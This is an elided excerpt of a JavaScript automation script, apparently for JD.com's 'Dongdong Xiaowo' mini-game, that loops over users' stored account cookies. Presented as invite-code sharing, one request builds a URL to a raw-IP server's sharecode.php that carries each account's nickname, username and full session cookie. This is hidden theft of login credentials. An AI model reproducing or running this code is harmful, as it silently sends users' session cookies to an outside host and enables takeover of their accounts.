...
!(async () => {
  ...
  //await updateInviteCodeCDN('http://124.156.143.77/sharecode.php?type=smallhome&inviteCode=1');
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.token = $.helpToken[i];
            ...
            if (data.head.code === 200) {
              if (data.body) {
                if (data.body.id) {
                  ...
                  create(`http://124.156.143.77/sharecode.php?id=${data.body.id}@${$.nickName}@${$.UserName}@smallhome@${cookie}`,"东东小窝");
...
function updateInviteCode(url = 'http://124.156.143.77/sharecode.php?type=smallhome&inviteCode=1') {
  return new Promise(resolve => {
